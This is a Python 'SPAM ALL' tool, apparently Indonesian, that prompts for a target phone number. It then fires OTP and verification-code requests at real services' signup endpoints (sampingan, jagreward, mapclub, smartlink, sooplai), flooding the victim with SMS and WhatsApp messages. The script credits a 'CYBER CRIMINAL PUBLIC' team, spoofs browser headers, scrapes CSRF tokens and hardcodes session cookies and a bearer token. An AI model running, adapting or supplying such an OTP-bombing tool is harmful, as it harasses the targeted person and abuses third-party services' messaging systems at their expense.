import os,sys,time,requests,random,json,re
from requests import post
from time import sleep
os.system("clear")
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./200)
def load():
    load = "\033[1;91m..."
    for x in range(1,101):
        time.sleep(1./12)
        print (f"\r\033[1;97m[\033[1;95m!\033[1;97m]Loading{load}\033[1;92m{x}\033[1;97m%", end="", flush=True)
        sys.stdout.flush()
def balik():
    f=input("\033[1;97m[\033[1;92m•\033[1;97m]MAU COBA LAGI bro? \033[90m(y/t): \033[1;92m")
    if f == "y":
       os.system("python spam.py")
    else:
       sys.exit("\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91mexit")
def cal1():
    ua={
    "Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":br})
    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
    if "Nomor tidak valid, cek kembali pengisian nomor anda" in r.text:
        print ("\033[1;97m[\033[1;91m-\033[1;97m]SPAM\033[90m-\033[1;91mGAGAL")
        sys.exit()
    else:
        #print ("[+]SPAM-SUCCESS")
        print

def call():
    head = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
    "Content-Type": "application/json",
    "Origin": "https://id.jagreward.com",
    "Referer": "https://id.jagreward.com/member/register/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
    "_ga": "GA1.2.2037151396.1584709855",
    "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
    "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
    }
    r = requests.get("https://id.jagreward.com/member/verify-mobile/"+br+"/", headers=head)
    if "Anda telah meminta kode verifikasi melebihi batas yang diizinkan. Harap tunggu sebentar sebelum membuat permintaan kode verifikasi yang lain." in r.json()["message"]:
        print ("\033[1;97m[\033[1;91m-\033[1;97m]SPAM\033[90m-\033[1;91mGAGAL")
        sys.exit()
    else:
        #print ("\033[1;97m[+]SPAM-\033[1;92mSUCCESS")
        print

def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        #print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        print
    else:
        print ("\033[1;97m[\033[1;91m-\033[1;97m]SPAM\033[90m-\033[1;91mGAGAL")
        sys.exit()
def rupa():
    ua={
    "Host": "wapi.ruparupa.com",
    "Connection": "keep-alive",
    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "X-Company-Name": "odi",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "user-platform": "mobile",
    "X-Frontend-Type": "mobile",
    "Origin": "https://m.ruparupa.com",
    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
    r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text
    if "success" in r:
        #print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
        print
    else:
        print ("\033[1;97m[\033[1;91m-\033[1;97m]SPAM\033[90m-\033[1;91mGAGAL")
        sys.exit()
def tok():
    ua = {
    'Connection' : 'keep-alive',
    'Accept' : 'application/json, text/javascript, */*; q=0.01',
    'Origin' : 'https://accounts.tokopedia.com',
    'X-Requested-With' : 'XMLHttpRequest',
    'User-Agent' : 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
    'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding' : 'gzip, deflate',
    }
    site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',headers=ua).text
    search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
    data = {
    'otp_type' : '116',
    'msisdn' : no,
    'tk' : search,
    'email' : '',
    'original_param' : '',
    'user_id' : '',
    'signature' : '',
    'number_otp_digit' : '6',
    }
    send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=ua, data=data).text
    if "true" in send:
        #print ("\033[1;97m[\033[1;92m+]SPAM \033[90m=> \033[1;92mBERHASIL")
         print
    else:
        print ("\033[1;97m[\033[1;91m-\033[1;97m]SPAM\033[90m-\033[1;91mGAGAL")
def wa():
    ua={
    "Host": "bos.smartlink.id",
    "Connection": "keep-alive",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://bos.smartlink.id",
    "Referer": "https://bos.smartlink.id/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "laravel_session=eyJpdiI6IllaMDVxOEh0WGFtdEVnR1JWWE5NMGc9PSIsInZhbHVlIjoiUFAzWUZnTDJ4Q3pKM3R1U1k4VE1yV1oxZ1wvOThkQThQaVFJSlBrWnRqd0hHZFJidjhoMXlcL3lMd2VmTmlYWVdCIiwibWFjIjoiZGE4NjZkMjU2MWE4MzJiYzQ3MWI4Y2FkMDRiNzBmYWQzYTliYzgwYzY3MTg3MDc5Njc4YjgxMzVhYWZhNDFkNyJ9"
    }
    t=requests.get("https://bos.smartlink.id/register").text
    token=re.findall(r"name=\"_token\" value=\"(.*?)\"",t)[0]
    dat={
    "idkaryawan":"",
    "_token":token,
    "multiowner":"false",
    "tiperegister":"telp",
    "nama":"Famztxt",
    "email":"",
    "country_code":"62",
    "nohp":"",
    "telp":no,
    "password":"tes1234",
    "ulangi_password":"tes1234",
    "kota":"3201",
    "kode_afiliator":"",
    "resultOTP":"",
    "whitelistid":"",
    "otpvia":"wa",
    "syarat_ketentuan":"on",
    "otp":""
    }
    r=requests.post("https://bos.smartlink.id/checkRegister", data=dat, headers=ua).text
    if "OTP Terkirim" in r:
        print
    else:
        print ("\033[1;97m[\033[1;91m-\033[1;97m]SPAM\033[90m-\033[1;91mGAGAL")
def soplai():
    ua={
    "Host": "api.sooplai.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "origin": "https://www.sooplai.com",
    "referer": "https://www.sooplai.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
kata("""
\033[1;97m                        SPAM ALL
    \033[95m•••••••••••••••••••••••••••••••••••••••••••

\033[1;97m[\033[1;95m•\033[1;97m]Author  :\033[1;96mMR.414N
\033[1;97m[\033[1;95m•\033[1;97m]\033[1;91mwa\033[1;97m :\033[1;96m082292838634
\033[1;97m[\033[1;95m•\033[1;97m]TEAM  :\033[4;92mCYBER CRIMINAL PUBLIC\033[00m
\033[1;97m[\033[1;95m•\033[1;93mgithub:\033[1;98mhttps://github.com/MR414N-ID
\033[90m______________________________________""")
no=input("\033[1;97m[\033[1;92m+\033[1;97m]NO TARGET(pakek 08 yahh)(0): \033[1;92m")
br=input("\033[1;97m[\033[1;92m+\033[1;97m]NO TARGET (tanpa 62/0)(8): \033[1;92m")
load()
for i in range(1):
    print ("\r\n")
    wa()
    mapclub()
    sleep(1)
    call()
    sleep(1)
    soplai()
    sleep(7)
    cal1()
print ("\033[1;97m[\033[1;92m+\033[1;97m]SPAM\033[90m-\033[1;92mSUCCESS")
balik()
